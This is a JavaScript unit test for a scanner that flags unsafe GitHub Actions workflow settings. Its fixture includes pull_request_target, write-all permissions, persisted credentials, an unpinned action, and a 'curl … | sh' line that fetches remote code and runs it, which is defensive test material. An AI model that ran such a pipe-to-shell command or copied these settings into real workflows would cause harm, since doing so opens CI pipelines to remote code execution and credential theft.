import assert from "node:assert/strict";
import test from "node:test";

import {
  inspectAgentActionPolicies,
} from "../../src/evidence/agent-action-policy-evidence.js";

test("detects bounded agent-action policy violations without workflow content", () => {
  const content = `
on: pull_request_target
permissions: write-all
steps:
  - uses: actions/checkout@v4
    with:
      persist-credentials: true
  - run: curl https://example.invalid/install | sh
`;
  const findings = inspectAgentActionPolicies([{
    path: ".github/workflows/unsafe.yml",
    content,
  }]);

  assert.deepEqual(
    findings.map((finding) => finding.identifier),
    [
      "GHA_PULL_REQUEST_TARGET",
      "GHA_WRITE_ALL",
      "GHA_PERSIST_CREDENTIALS",
      "GHA_UNPINNED_ACTION",
      "GHA_REMOTE_PIPE_SHELL",
    ],
  );
  assert.equal(JSON.stringify(findings).includes("example.invalid"), false);
});

test("accepts a least-privilege pinned workflow", () => {
  assert.deepEqual(inspectAgentActionPolicies([{
    path: ".github/workflows/safe.yml",
    content: `permissions: read-all\nsteps:\n  - uses: actions/checkout@${"a".repeat(40)}\n    with:\n      persist-credentials: false\n`,
  }]), []);
});
